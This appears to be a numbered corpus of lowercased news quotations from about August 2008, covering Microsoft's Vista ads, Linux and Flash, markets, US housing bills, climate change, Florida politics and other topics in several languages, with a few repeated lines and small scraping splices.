7543988 i remember having a conversation with a friend several years ago about how when a tv show starts losing its ratings they will almost always bring in a celebrity to try and revive it
7543989 i think someone at microsoft marketing must be from the tv industry
7543990 somehow i doubt that was the kind of comparison microsoft was hoping to make
7543991 what could be more appropriate than using professional comedians as vista pitchmen
7543992 i wish theyd use judy tenuta now that would be ads that bite
7543993 and they blew it and then they blew the second impression too
7543994 i cant imagine what they think seinfeld can do to help my customers wont go near vista at this point and i doubt anything other than a new os release would fix that
7543995 if thats what they are planning it will backfire big time i can see random insults moving things from the average person hating vista to the average person hating microsoft no one likes being told theyre an idiot
7543996 the perfect spokesman for windows built on technology developed before the internet well known but not very relevant and even though you really cant avoid windows nobody is fanatical about it
7543997 that really has a synergy with seinfeld you can turn on any broadcast channel in any city in america and be sure theyre playing episodes of seinfeld but nobody is actually a regular viewer of those episodes
7543998 as much as seinfeld was great during its heyday watching it today very clearly dates it and exposes that its not as timeless as theyd like you to believe
7543999 i fear that by drawing on this star of the 90s microsoft may be showing its longing to return to a time when buying a computer meant buying windows
7544000 short of every linux distro calling home which i hope will never happen there may never be a way to know how many linux users there are
7544001 perhaps the downloads of some cross platform application would give a rough idea but that application would have to be something that a linux user a mac user and a windows user would want equally if anyone has a better idea i would love to hear it
7544002 although its difficult to tell how many people are using linux microsoft must have a very good idea of how many people are not using vista
7544003 its a bit though not entirely like trying to calculate the market value of food from a home kitchen compared to that of restaurant meals
7544004 measurement of prices paid is not the only difficult task
7544005 you also have to consider the cost of sampling dont like ubuntu try fedora quickly and free opportunity costs for the software itself a low price now even for what is perceived as lower quality goods in some contexts means money available for other things and freedom to experiment and recombine perhaps windows makes sense for some people in a given organization but the data entry might taste just as good if done on linux based thin terminals
7544006 makes less sense as a concept when the market is as fluid as the free software world
7544007 machines dual boot are repurposed are used as vm hosts or serve apps to dozens of other machines which may or may not be running the same os in the first place and not just for free software sure you can count certificate or license sales for various versions of windows but does anyone even pretend that represents the total number of windows installs
7544008 the best metric to measure the success or failure of an open source project is the number of users moved enough to contribute their vision to the project which enables more people to benefit
7544009 that number not the number of users will measure how much momentum any push for change will get
7544010 it has occurred to me that flash on linux is the one major entry barrier controlling acceptance of linux as a viable desktop operating system
7544011 no matter how stably smoothly efficiently and correctly linux runs on a machine the public will continue to view it as second rate if flash keeps crashing i really do have to suspect adobes motivation for keeping flash on linux in such a deplorable state
7544012 once everybody is using it they dont put any effort into making it work better thats not to say that open source software is always better but at least with open source the more popular your software is the more effort is being put into improving it
7544013 it crashes a lot on windows and linux its annoying on windows and linux the only question i have is why do people still care about flash
7544014 silverlights only chance for survival is adobe screwing flash up and boy do they seem to be going out of their way to do that
7544015 in a school setting its obviously very important to have technology in place that blocks inappropriate and malicious content in our testing secure web consistently blocked threats effectively
7544016 before we start let us hold hands and bless the meal
7544017 you misunderstood the reason i undid my fly its because i am full maybe later

7544020 do you really think that is the best thing to say to the rest of africa about zimbabwe
7544021 what companies are now witnessing with virtualization is greater difficulty in identifying performance related problems particularly as they adopt hybrid infrastructures where mission critical applications span physical and virtual environments the higher management costs that result offset server consolidation cost savings achieved integrien solutions address performance issues and help companies maximize roi from their move to virtualization we are thrilled to leverage vmware infrastructure and to be part of the vmware tap program we look forward to helping our customers achieve improved virtual infrastructure management

7544025 the whole idea of a roll call vote could be in flux at this point
7544026 the clinton people here theyve said they wanted catharsis they wanted that roll call but they may not get it
7544027 they dont want to be blamed for any trouble at this convention
7544028 the overall range trade remains in effect here and that is all linked to the fed neutrality
7544029 generally markets react favourably to the housing data we do have month end and bonds remain firm into month end
7544030 most of the dealers are trying to squeeze the last week of sunshine and everyone is hoping for no news because no one wants to deal with risk in the last days of august
7544031 oil seems to be the primary variable that is causing volatility across all asset classes
7544032 everyone hopes that everything will be quiet but things could get ugly very quickly if geopolitical situations worsen
7544033 there is not a lot of new news in the markets and its going to be the same old story but the fact that it is thin trading anything could happen
7544034 i think if we get a positive number the markets will breathe a sigh of release everyone is very concerned about the classical definition of a recession it wont be a great number but as long as its positive it will be good for the markets
7544035 i think it will be very important but there is a lot more data to be worked out and the bank of canada is going to remain in wait and see mode

7544089 we are in for a long battle as the floods have come in areas which are not prone to it
7544090 we live so much of our lives in an intolerable scramble of panting feverishness all of the grasping and grabbing all of the controlling all of the manipulative dynamics of life exhaust us
7544091 the prayer of rest has a way of tempering our gnawing need to always get ahead
7544092 if we ever want to know the degree to which we are enslaved by the passion to possess all we have to do is observe the difficulty we have maintaining a sabbath rhythm
7544093 instead of striving to make this or that happen we learn trust in a heavenly father who loves to give this does not promote inactivity but it does promote dependent activity no longer do we take things into our own hands rather we place all things into divine hands and then act out of inner promptings
7544094 there are three well established practices designed to lead us into the prayer of rest the first is solitude the second is silence and third is recollection
7544095 in solitude we voluntarily abstain from our normal patterns of activity and interaction with people for a time in order to discover that our strength and well being come from god alone
7544096 solitude writes louis bouyer serves to crack open and burst apart the shell of our superficial securities
7544097 silence is the stilling of creaturely activity it is a silence of our grasping manipulative control of people and situations
7544098 we must silence every creature we must silence ourselves to hear in the deep hush of the whole soul the ineffable voice of the spouse we must bend the ear because it is a gentle and delicate voice only heard by those who no longer hear anything else

7544105 there is an obvious israeli involvement in the present conflict between georgia and russia
7544106 melman wrote that georgia became a real el dorado for israeli arms dealers and numerous representatives of the army and intelligence services some former generals like israel ziv and gal hersh with his company defensive shield are very active there
7544107 hersh and ziv are mainly training and consulting georgian army units they are using the chain method common among israeli arms dealers a main contractor wins a tender and employs sub contractors in this case israeli officers and former shin bet employees
7544108 to every israeli agent representing an israeli defense company is attached a cousin of the defense minister who opens the doors for him
7544109 the israeli military industries upgraded the georgian air force sold unmanned aerial vehicles advanced artillery systems and trained infantry units

7544130 for the seventh year in a row usao remains the highest ranked public college in oklahoma in the annual rankings by americas best colleges
7544131 usao is ranked 15th or in the second tier among the top undergraduate colleges in america on the magazines
7544132 usaos academic quality rating is 3 3 according to the magazines formula that puts us among the solid private schools on the list and is the central reason we do well among all public schools
7544133 of the 319 baccalaureate colleges listed usao is ranked in the top 11 percent academically
7544134 in the great schools great prices list 190 colleges and universities are included nationally
7544135 usao appears as the top ranked baccalaurate college in the western united states
7544136 this distinctive list is based on the best value as it relates to a schools academic quality
7544137 the higher the quality of the program and the lower the cost the better the deal
7544138 we ranked in the top five in the west for students graduating with the least debt and 49 percent of our students graduated debt free
7544139 combine those facts with our academic ranking and students find solid value here usao stands out in oklahoma higher education
7544140 the mep is our plan to raise internal standards by increasing faculty numbers making our wage structure more nationally competitive and placing greater emphasis on faculty guided undergraduate research and service learning
7544141 as part of this plan were also in the midst of dramatically raising our admission standards all oklahoma state institutions determine admissibility on three criteria two of these take into account class rank and gpa one allows instant access based solely on a minimum act score for the states research universities this minimum act is 24 for all other state universities it is 20 for usao it is 23 for fall 2008 next fall its a 24 were raising all three admissions criteria and by fall 2010 all of them will be equal to the highest in oklahoma
7544142 it was a pleasure to see usao in the top rankings in the baccalaureate colleges category
7544143 and with usaos continuing improvement in critical areas such as freshmen retention rates class sizes and the quality of its faculty we should continue to hold high rankings in addition i believe the high quality of the education to be obtained at usao is reflected in its no 1 ranking among great schools at great prices

7544331 anytime someone says a patient is terminal it could be an issue for a jury now and theres always going to be some expert out there to say someone was salvageable

7544404 the time for the department of homeland security dhs to scrap their current approach to airline security is well overdue now that the terrorist screening centers terrorist watch lists have passed one million entries
7544405 the american people would be comforted if our presidential candidates denounced these burdensome practices senators mccain and obama should declare a moratorium on the use of the lists unless drastic measures are taken to improve their accuracy and protect innocent americans hoping to travel without burden
7544406 watch list systems are worse than worthless they create security risks by diverting scarce homeland security resources away from actual terrorists by focusing attention on hundreds of thousands if not millions of innocent travelers those innocent victims wrongly caught in the dragnet of suspicion are left without recourse to clear their good name upon completion of the investigation that uncovered all these deficiencies congress should publish all findings and recommend that dhs approach airline security in a manner that is both effective for our nations security and respects the freedom and liberty of innocent travelers
7544407 in order to better understand people i need to listen to them
7544408 if we can create easily accessible channels through which we can listen to nature we might get meaning and information that we wouldnt otherwise know
7544409 replaced people with machines so as to listen continuously and understand as much as possible but it turns out that a lot of citizen scientists including myself would rather be outdoors so the focus turned to how to better tell the story of nature through people
7544410 what can we tell about the environment from both the instruments and the people
7544411 the push now is toward facilitating international long distance collaboration for observing nature
7544412 for example in dealing with owls people elsewhere can listen to our backyards while we sleep and we can listen to their backyards while they sleep
7544413 im really exploring democratic venues through which large numbers of people can listen in
7544414 in a way that helps us obtain a broader understanding and appreciation of nature

7544439 that guantanamo detainees have no constitutional rights and therefore can be tortured consistent with the constitution is abhorrent in a nation of laws and is in direct conflict with this courts precedents
7544440 that officers who were aware of the illegality of their conduct under numerous sources of law can nevertheless avoid liability for their actions through a calculated reliance on purported constitutional ambiguity is equally pernicious and contrary to this courts longstanding doctrine that qualified immunity does not protect defendants who engage in deliberately unlawful conduct
7544441 finally the court of appeals conclusion that torture and abuse are within the scope of employment and therefore respondents are immune from liability for their conduct is fundamentally at odds with the universal principle that torture is

7544447 to find so many polar bears at sea at one time is extremely worrisome because it could be an indication that as the sea ice on which they live and hunt continues to melt many more bears may be out there facing similar risk
7544448 as climate change continues to dramatically disrupt the arctic polar bears and their cubs are being forced to swim longer distances to find food and habitat
7544449 while these bears are swimming around in an ice free coastal arctic ocean the only thing the state of alaska is doing is suing the federal government trying to overturn the listing of polar bears
7544450 the bottom line here is that polar bears need sea ice sea ice is decaying and the bears are in very serious trouble for any people who are still non believers in global warming and the impacts it is having in the arctic this should answer their doubts once and for all

7544459 technologies that are in use today including the widely used claus process are more energy and capital intensive
7544460 in addition they also lose the hydrogen in the process instead of capturing the hydrogen from the hydrogen sulfide the claus process ends up converting it into water
7544461 if a pilot plant demonstrates that the process is a major improvement over existing technology and we believe it is it will spur the interest of industries that use a process to separate hydrogen sulfide
7544462 companies will be able to retrofit their facilities with the process technology or construct new plants that incorporate it
7544463 in the meantime we are working with argonne to use the technology for other energy applications such as gas cleanup for integrated gassification combined cycle plants

7544479 we are being hampered in our efforts to understand the impacts of these climate changes by lack of political leadership and needed resources for science observation and computing
7544480 the bush administration has had to deal with a lot of very difficult issues over the past few years so this has made it difficult to provide the needed resources in this area weather and climate research
7544481 even when the administration has made substantial requests and the congress supported those requests subsequent impasses in the budget process have significantly reduced or eliminated all together that support
7544482 federal law requires the president to develop a coordinated national policy on global climate change yet coordination of federal weather and climate activities remains inadequate

7544573 almost from the inception of the canal zone questions arose as to whether the zone was considered part of the united states for constitutional purposes or in the phrase of the day whether the constitution followed the flag
7544574 while the general spirit and purpose of the constitution is applicable to the zone that domain is not a part of the united states within the full meaning of the constitution and laws of the country in 1953 congress passed legislation to specify the status of americans born in the canal zone and to exclude non americans born there from citizenship title 8 section 1403 of the united states code grants citizenship to those born in the canal zone with at least one parent who is a united states citizen this differs from the provision in the fourteenth amendment which grants citizenship to all born in the united states regardless of parental nationality

7544580 this legislation will bring relief to many florida homeowners who face losing their homes the measure also puts long term fixes in place to prevent a housing crisis like this from occurring in the future
7544581 the reform includes a provision to modernize the fha allowing the program to insure larger loans and to reach more families that need help the bill will also provide a stronger oversight system for gses so they are better able to serve homebuyers and fulfill their public mission in addition tax credits for first time homebuyers will encourage those looking to make an initial purchase further helping to stimulate the housing market
7544582 although congress has taken a number of steps to help alleviate the current housing crisis we need to proactively put practices in place that will help prevent another crisis down the road
7544583 setting minimum national standards for all residential mortgage loan originators will go a long way toward achieving that goal i am pleased this measure is included as part of the broader housing package
7544584 while we still need to work to make appraisal standards uniform across the nation this strengthens standards for fha appraisals and ensures the integrity of the new fha program that offers foreclosure assistance
7544585 my commitment to doctors has always been to make certain they do not suffer pay cuts due to a faulty medicare reimbursement formula
7544586 the measure we moved forward today does not provide the kind of solution doctors deserve but this is the only option to stop doctors in florida from having their pay cut by 10

7544592 the fleets location in jacksonville will provide tremendous support to the u
7544593 this is a real crisis for floridians and the american family inaction from congress is not acceptable
7544594 more production is part of the equation while i have guarded floridas coast there are safe places we can explore including the 8 million acres we opened in the eastern gulf we need to throw everything at the problem more research into new and alternative sources of energy and development of better plug in vehicles in addition conservation is a crucial element
7544595 although congress has taken a number of steps to help alleviate the current housing crisis we need to proactively put practices in place that will help prevent another crisis down the road
7544596 setting minimum national standards for all residential mortgage loan originators will go a long way toward achieving that goal i am pleased this measure is included as part of the broader housing package
7544597 this broad housing legislation that the senate passed today will help hundreds of thousands of americans keep their homes
7544598 and the safe mortgage licensing act will ensure that americas mortgage brokers and lenders are ethical professionals unfortunately weve heard countless stories of bad actors in this industry people who engage in fraudulent lending practices such as steering people into loans they clearly cannot afford simply put the only way to crack down on these abuses is to ensure that brokers and lenders meet basic standards and earn a license this legislation does exactly that

7544611 we are very excited about moving forward into this important 28 day study with rvx 208 our previous clinical study demonstrated that rvx 208 was safe tolerable and had favourable pharmacokinetics
7544612 this trial will continue to examine safety and tolerance as well it is a proof of principle study for apoa i production and hdl functionality approximately half of the subjects will have low levels of hdl cholesterol a condition associated with significant increased risk of cardiovascular disease
7544613 the ensuing phase 1b 2a study comprises several novel facets to expedite the clinical process for rvx 208 and its eventual registration as a drug
7544614 along with the required regulatory provisions that must be addressed such as safety tolerance and pharmacokinetics the study also will measure key reverse cholesterol transport markers which rvx 208 impacts these are exclusive favourable features that make this drug unique among its competitors

7544630 i congratulated him on playing well in the first 45 minutes but i said he needed to make his mark in the game
7544631 thankfully that is what he did i thought it was a great strike and he was a handful all afternoon for the opposition
7544632 he was up against players with a lot more experience than him but still had an impact on the game
7544633 all strikers want to score their first goal and he has been able to do that we are delighted for him

7544680 this law will bring immediate relief to the suffering homeowners facing foreclosure while addressing long term changes necessary to strengthen the housing industry
7544681 this is a prime example of how effective congress can be when legislators put politics aside and come together in a bi partisan manner to best serve the american people during a time of crisis
7544682 aucun des engagements quil avait pris nont t tenus cela nous contraint retirer notre soutien la coalition et nous asseoir dans lopposition
7544683 the high cost of fuel is the biggest issue facing our industry
7544684 more than 1 900 fleets went out of business in the first six months this year largely due to the dramatic rise in fuel prices thats why were taking a comprehensive step with fuelwatch addressing specifications maintenance driver training and vehicle performance together so we can squeeze every possible mile out of every gallon of fuel
7544685 we know from our experience however that even the best specd and maintained truck can deliver poor fuel economy if the driver lacks the knowledge and training to use it efficiently
7544686 the driver has the biggest impact good or bad on fuel economy
7544687 we need to raise the bar to look for ways to deliver incremental fuel economy improvements to our customers that will save them money over time
7544688 we must help our customers not just on the vehicle side but on the operations side where more human factors are in play we want to make sure everything possible is in place for them to achieve better fuel economy
7544689 we have agreed to launch a joint education training and employment initiative which will come back to us with specific recommendations for action by years end
7544690 neither this group nor any other has any other official status or connection with the scheme
7544691 given long term inflation expectations however this implied that consumers expected no real gains in home prices over the next five years
7544692 these guys who headed these companies enriched themselves not by taking risks as you do in the private sector and paying the penalty like jimmy cayne at data is a real time snapshot data is delayed at least 15 minutes
7544693 cut the official policy rate too fast and too far and risked its reputation for being serious about inflation
7544694 lenders have been hit by a shock so severe that they are contracting and withdrawing from private sector lending
7544695 these hawks at the fed are arguing in effect that we have to throw people out of work more quickly than we already are to ensure against inflation

7544702 high gas prices are the single most important issue to americans right now and we need to focus on solutions for short term relief and long term domestic energy development
7544703 in the long term we need to take full advantage of our domestic resources which includes developing our oil supplies and also increasing our use of nuclear power nuclear power is safe emissions free power that can be used to make our nation energy independent
7544704 florida has been hit hard by the housing crisis ranking second in the nation in record foreclosures last year this bill is the product of congress coming together to address this crisis and bring relief to floridians who face losing their homes
7544705 while addressing the current crisis this also strengthens the housing market for the long term modernization of the fha will allow the program to serve more families after the recent problems with freddie mac and fannie mae it is clear that we need a stronger oversight system for gses to better fulfill their public mission and this bill puts that system in place
7544706 the current crisis has shown us that while some homeowners unfortunately made bad financial decisions others were clearly taken advantage of by bad actors in the housing industry national licensing standards will help decrease the number of unscrupulous loan originators and predatory mortgages
7544707 the safe act will help to eliminate fraudulent loan originators from the housing industry and give more reassurance to homebuyers at a time when they are making an important financial commitment in purchasing a home
7544708 this is the first step in working to make appraisal standards uniform across the nation
7544709 this provision strengthens standards for fha appraisals and ensures the integrity of the new fha program that offers foreclosure assistance
7544710 the report released today further demonstrates why agencies need tools to stop fraud at the front end rather than having the department of justice get involved at the back end after the fraud has occurred
7544711 medicare fraud is not only hurting seniors but it is also wasting taxpayer dollars instead of continuing the current practice of pay and chase the federal government needs to shift to a policy of detect and prevent
7544712 the presidents action underscores the importance of congresss attention to this matter in 2006 we secured a law that opened substantial areas to development while also protecting the eastern gulf of mexico until 2022 even with this announcement that protection remains
7544713 in light of the current energy crisis congress must take steps to develop domestic resources while encouraging conservation i look forward to congress acting to make it possible for states to engage in offshore development if they so choose and respect the wishes of states like florida that wish to keep drilling at a distance that doesnt impact our environment our economy or the missions of the united states military
7544714 this is what floridas communities need right now the money and reassurance that assistance is on the way fay is leaving a lot of debris in her wake and expediting removal helps keep the public safe
7544715 with more than 1 million recreational boaters this unnecessary permit requirement would have hit florida hard
7544716 requiring family boaters to secure a clean water act permit so that they can wash their boat fish or go waterskiing is unreasonable costly and essentially unenforceable mobilizing the epa to take on this needless task would have been an additional cost and burden to families and a tremendous waste of taxpayer resources
7544717 most charter boats dont have the ballast issue that is the target of the court ruling there ought to be an opportunity to study where additional regulation is necessary and where it isnt
7544718 this bill provides a reprieve for small business owners who are already dealing with rising fuel prices and a troubled economy
7544719 americans need to have peace of mind that they have life insurance coverage when traveling abroad people should not be denied coverage or have to pay outrageous amounts for a policy based on where they travel
7544720 this legislation ensures that insurance companies cannot use future travel plans as a basis to increase rates or cancel coverage it is my hope that the banking committee will act quickly to pass the lift act so that it can move to the full senate for consideration
7544721 its nonsense that the u s government is inflating the price of ethanol especially at a time when american families are paying record high prices for fuel
7544722 not only is this tariff costing americans more at the pump its preventing us from diversifying our fuel supply
7544723 if were serious about reducing gas prices in this country removing this tariff and other arbitrary mandates created by congress would help reduce record high fuel costs
7544724 you can have your cake and eat it too cookies
7544725 permafrost temperatures in alaska have gone up about 1 degree centigrade over the last 50 years

7544731 the government knows that these are bad laws and there is no reason to keep bad laws in place for one minute longer than they need to be
7544732 the board acknowledged that in the time since the original decision debate about the sexualisation of children has crystallised community concern about the unsolicited exposure of children to ads dealing with sexuality
7544733 with the shift in community standards the content of the billboard was no longer acceptable
7544734 the bureau did research and found the community was more conservative than the board on these matters so whats changing here is the board not the communitys views
7544735 all this is really showing is how out of touch they were and it raises the question of what theyre out of touch with now

7544745 the information ive got is that this all happened because the statue was reported by an extremely conservative right wing member of the church
7544746 when people take notice of a person of that sort then these kinds of things happen as a reaction
7544747 i think a church that refuses homosexual people as part of the church is not catholic and not christian
7544748 if were going to be doing what we do in the tradition of jesus then theres no basis for refusing anyone
7544749 the archbishop hopes wisdom prevails in south brisbane and i do too
7544750 northern maine businesses are smaller in size but they would get the same benefit from flying as larger companies
7544751 if it was going to happen id have to be the one to do it
7544752 being able to share the cost with five six seven people it makes flying very attractive
7544753 small businesses cant foot a 2 000 bill even if it would greatly benefit them
7544754 the majority said they wanted to leave early in the morning and be home by early evening
7544755 were in a full court press to promote the start up
7544756 we just want to do everything we can to make folks go for it
7544757 s que joe har una buena campa a con obama y pienso que ser formidable
7544758 obviamente joe y yo hemos estado en diferentes campos filos ficos pero le considero un buen amigo y un buen hombre
7544759 el apoyo de la senadora para barack obama es claro
7544760 clinton ha dicho repetidas veces que barack obama y ella comparten el compromiso de cambiar el rumbo del pa s de sacar a eeuu de irak y de ampliar el acceso a la asistencia m dica
7544761 es interesante que eso no aparezca en el aviso de los republicanos
7544762 we had cause to write metro digital and its alter ego mr john nwafor in respect of the piracy of our sporting channels
7544763 the signals to the epl matches meant for the mid east territory were illegally down linked by the use of showtime smart cards purchased in the mid east and re transmitted to subscribers in the port harcourt onitsha and asaba areas of the country by metro digital
7544764 on further noncompliance by metro digital antipiracy enforcement raids were conducted by the ncc on the premises of metro digital
7544765 in a school setting its obviously very important to have technology in place that blocks inappropriate and malicious content in our testing secure web consistently blocked threats effectively
7544766 what companies are now witnessing with virtualization is greater difficulty in identifying performance related problems particularly as they adopt hybrid infrastructures where mission critical applications span physical and virtual environments the higher management costs that result offset server consolidation cost savings achieved integrien solutions address performance issues and help companies maximize roi from their move to virtualization we are thrilled to leverage vmware infrastructure and to be part of the vmware tap program we look forward to helping our customers achieve improved virtual infrastructure management
7544767 with this issue were reaching out to people who thought we lost our way on fiscal issues
7544768 we hope as a result of that hearing theres going to be a much greater understanding of how big a problem it is
7544769 theres just so many needs in this arena and so little money that for it to be walking out the door with criminals is really a criminal deed itself
7544770 the more realistic approach is to highlight this issue to continue to work on it to continue to build support and then make a really really strong effort the next congress as part of what i believe will be a larger healthcare legislative effort
7544771 die ungekl rten probleme im globalen finanzsektor f hren dazu dass wir weiter einen k uferstreik haben
7544772 wir befinden uns mitten im sommerloch und warten auf impulse aus amerika
7544773 wenn der preis stimmt ist das auf jeden fall eine erleichterung f r den mutterkonzern
7544774 wir bleiben skeptisch ob die commerzbank kurzfristig mit der dresdner bank wert generieren kann
7544775 es gab wieder einmal ger chte dass nxp an einer bernahme interessiert sei
7544776 das wurde zwar dementiert es scheint aber niemanden zu st ren

7544778 from castros cuba to the u s senate one mans pursuit of the american dream
7544779 i set out to write this book for my children and grandchildren and i studiously stayed away from that
7544780 i would hope this is a book can inspire young people particularly young people who are facing some hardship whether they be immigrants or in foster care
7544781 mr president during the time i am privileged to serve i would hope that i could have a voice on issues relating to cuba
7544782 mel will be able to have something to say on cuba
7544783 no matter the conflict members of our armed forces answer the call rise to the challenge and make tremendous sacrifices on behalf of a grateful nation
7544784 as an immigrant to america i have been the beneficiary of those who sacrificed so that i might have the opportunity to live in freedom having lived in oppression i can assure you that freedom is a valued gift and i thank you for your service in the cause of freedom
7544785 access to quality health care is a right everyone who has worn our nations uniform deserves
7544786 i am happy to say that this long overdue dream of so many central florida veterans is finally moving forward we have secured the property the plans are in the works and its only a matter of time before a new hospital comes online and begins serving area veterans
7544787 having an office at the usf tampa campus will provide better accessibility for people seeking assistance with federal issues
7544788 i am excited to join the usf community and look forward to serving gulf coast residents at this location
7544789 i think the real concern is that by allowing postings to happen you become an agent of disclosure by putting defamatory information on a website
7544790 the company could become liable unless there is a specific terms of service agreement
7544791 its very important for the company to think about what the terms of service agreement says
7544792 there really havent been any problems ive been aware of
7544793 many people who like that product will get on and say thats not true
7544794 if one gets on and gives it a glowing review saying its the greatest thing since sliced bread 40 others will have a different opinion and erase that one favorable review
7544795 google safe search and safe browsing help protect against internet threats and offensive content but the web filters need to be set up individually for each pc on the network a very time consuming process
7544796 because network boxs new web content filtering engine will be standard on our managed security service these features will be set up at the internet gateway which means they can be quickly and easily applied across a customers entire network
7544797 during this month ill come out every day for one reason or another
7544798 i heard the rest of the week is going to be sunny
7544799 obviously its an important part of the economy here for the blueberry growers for the rakers for the businesses that serve the rakers
7544800 its one of the few bright spots in the washington county economy
7544801 we let the retail slip when freezing came in during the 1950s and we finally got back into the retail with frozen blueberries in the bag in the grocery store and the blueberry juice
7544802 one of those sort of doomsday scenarios that keeps me up at night
7544803 if you havent sold a sufficient amount of your inventory then you wont have enough to bring in your next crop
7544804 thank you for taking these few minutes to learn about wymans
7544805 the food industry is remarkable across nearly every measure and so is our business no matter what the class of trade or the country that we are exporting to all of our customers are looking for higher quality and lower cost
7544806 simply means that weve got to do everything we can to grow our business
7544807 do i miss it yes but im in management now
7544808 my time is more valuable managing my blackberry than managing a tractor
7544809 the margins are getting smaller and the risks are getting higher
7544810 you really need to understand the markets youre supplying and the input costs youre putting into your crop
7544811 theyve seen some rough times and they are still here
7544812 regard less of demand you have to have a quality product to keep customers coming back
7544813 and maine does appear to have a quality product even after a three week boat ride
7544814 every load i sent to brazil i made a profit
7544815 this is what maine needs here we need a break
7544816 if we can supply good product they dont mind paying for it
7544817 has the export thing gone blemish free no am i better exporter now no question i paid a little tuition last year
7544818 theres a lot of changes going on and you have to change with the times
7544819 without the new technology we have now i dont think wed be able to sustain our growth over the past 10 years
7544820 that returns 6 to our bottom line without adding any cost to the system
7544821 im bullish when everyone else is pulling in their horns
7544822 you could have full control over your environment by just being able to move your tongue
7544823 this could give you an almost infinite number of switches and options for communication
7544824 its easy and somebody could learn an entirely different language
7544825 left up could be turning lights on right down could be turning off the tv
7544826 you could control not just your chair your tv your computer but your entire life
7544827 we have been made aware of a security breach at the offices of an external contractor involving the loss of personal information about offenders in england and wales
7544828 a full investigation is being conducted police and the information commissioner have been informed
7544829 the data was held in a secure format on the contractors site it was downloaded onto a memory stick for processing purposes which has since been lost the transfer of data on this assignment to the external contractor has been suspended
7544830 we are collaborating closely with the home office on this matter we have no further comment to make at this time
7544831 it is deeply worrying that after a number of major data losses and the publication of two government reports on high profile breaches of the data protection act more personal information has been reported lost
7544832 the data loss by a home office contractor demonstrates that personal information can be a toxic liability if it is not handled properly and reinforces the need for data protection to be taken seriously at all levels it is vital that sensitive information such as prisoner records is held securely at all times
7544833 we have banned tehreek e taliban pakistan because of their involvement in a series of suicide attacks interior ministry chief rehman malik said
7544834 the message on the billboards will start to go up monday and will remain there for a month said annie laurie gaylor co president of the freedom from religion foundation
7544835 desde mi punto de vista no es solamente si la sociedad de le n est preparada o no sino si se da en el ambiente en general la conveniencia de que existan este tipo de clubes donde a veces personas que tienen una conducta desviada no quiero decir que todos los que vayan ah sean as pero puede darse el caso aprovechen para exaltaciones y para degeneraciones que finalmente repercuten en el ambiente de la sociedad en el ambiente de la familia
7544836 habla de dos respuestas que tiene la autoridad el responder con las armas y con la pena de muerte est n ah siempre como posibilidad la polic a tiene que responder tambi n con las armas ya no se puede con el garrote

7544843 high gas prices are the single most important issue to americans right now and we need to focus on solutions for short term relief and long term domestic energy development
7544844 companies like csx are an important part of the long term strategy which will have to incorporate reliable available and inexpensive sources of energy
7544845 our bill will give agencies the tools to stop fraud at the front end rather than having the department of justice get involved at the back end after the fraud has occurred
7544846 instead of continuing the current practice of pay and chase the federal government needs to shift to a policy of detect and prevent
7544847 this will lead to less fraud and greatly reduce identity theft among our seniors
7544848 it will also allow seniors and the government to easily take a medicare recipients number out of circulation when fraud is detected
7544849 i compliment the group for coming together in a bipartisan way to try to address the current energy crisis
7544850 what i dont want is for the best to be the enemy of the good
7544851 if we can come up with a genuine bipartisan compromise in which i have to accept some things i dont like and the democrats have to accept some things they dont like when its actually moving us in the direction of energy independence im open to that
7544852 what i will not do is support a plan that suggests that drilling is the answer to our energy problems
7544853 no one really knows where barack obama is on the issues these days
7544854 what we do know is that hes spent months attacking john mccains common sense plans to increase domestic production so anything he says should be taken with a grain of salt hell probably try to refine his stands a few more times before november if it is in his political interest
7544855 the one thing that ive said consistently when it comes to the florida coastline is that as dependent as this state is on tourism as important as that coastline is weve got to proceed with extreme caution when it comes to anything that has an impact on that extraordinary treasure
7544856 to help formulate this vision im going to re establish the national aeronautics and space council so that we can develop a plan to explore the solar system a plan that involves both human and robotic missions and enlists both international partners and the private sector and as america leads the world to long term exploration of the moon and mars and beyond lets also tap nasas ingenuity to build the airplanes of tomorrow and to study our own planet so we can combat global climate change under my watch nasa will inspire the world once again
7544857 in no way do i think that john mccains campaign is being racist i think theyre being cynical
7544858 i think they want to distract people from talking about real issues
7544859 and government cant and shouldnt do for us what we can do for united states senate 356 russell senate office building washington dc 20510

7544863 the reality is there probably wont be any more data breach activity than normal were just going to hear and talk about every one now which is a healthy thing because it provides transparency and establishes security performance as a market differentiator but it will be painful for a few years
7544864 while notification is an important mitigation strategy it will not always be the appropriate response to a breach providing notification about low risk breaches can cause undue anxiety and de sensitise individuals to notice
7544865 once an agency and organisation has discovered or suspects that a personal information security breach has occurred they should take immediate common sense steps to limit the breach
7544866 notification can be an important mitigation strategy that has the potential to benefit both the agency or organisation and the individuals affected by a personal information security breach the challenge is to determine when notification is appropriate while notification is an important mitigation strategy it will not always be the appropriate response to a breach providing notification about low risk breaches can cause undue anxiety and de sensitise individuals to notice each incident needs to be considered on a case by case basis to determine whether breach notification is required

7544905 being considered one of the best places to live in america by such a credible source not only reinforces what we residents already know it also exposes the many benefits of our community to the world
7544906 apparently our experience over the years in midlothian made an impact on my children when my daughter relocated with her husband they chose a home in the midlothian area primarily for the cost of housing quality of schools and because of her experience as a child growing up in the area
7544907 i like the pool the playground the tennis courts and i have all different kinds of friends
7544908 midlothian offers the best real estate because you not only get great houses in the right price range but you get some land too i also see great diversity in midlothian blacks whites asians indians and its important because things are not just local anymore theyre global
7544909 im very pleased that the only area in the entire richmond region named to the money magazine list was here in chesterfield county midlothian is a great place when you look at the combination of history preservation and growth making it a terrific story of economic development
7544910 its on our web site we refer to it when were talking with prospects or sending out information we use national rankings such as this to promote the county
7544911 in combination with the other virginia localities named on the list it keeps virginia front and center with those seeking to relocate from a retirement standpoint or with those choosing to relocate a business

7544918 midlothian has always had a defining image that goes beyond just being another bedroom community to richmond it seems when you have that defining image then community pride will stay strong which results in citizens re investing in the community with volunteer time festivals school support athletic leagues etc this community pride and citizen participation is what makes midlothian a great place to live
7544919 the atm system is practiced in all the global banks and now al warkaa bank started working out the as the first bank we set the machines in all branches and some markets the bank intends to distribute a large number of machines as well as put in some ministries we aim to expand the bank automated
7544920 we have given the card to some customers who have registered accounts of high and assured credits and can withdraw the amount wanted from anywhere near
7544921 there is demand at the atm now while there was no friction between the citizen and the system but now there is a growing demand with new level
7544922 when iraqi citizens recognized that machines are located in neighboring countries they become disturbed for not being existent in iraq now with this device you dont need any longer to stand in front of the cashier and it is serving time in counting the money
7544923 it is an important step towards facilitating the task and we hope to circulate to all banks and their branches because everything happens in the evolution of the country is a joy for us and hope to provide more facilities and solving the problems of the banking sector in iraq to have an important role in the economic process and provide the needs of the people
7544924 this system will provide an easy way to deal with the cash money we can use the card to facilitate our affairs and we hope to spread this method in all parts of iraq

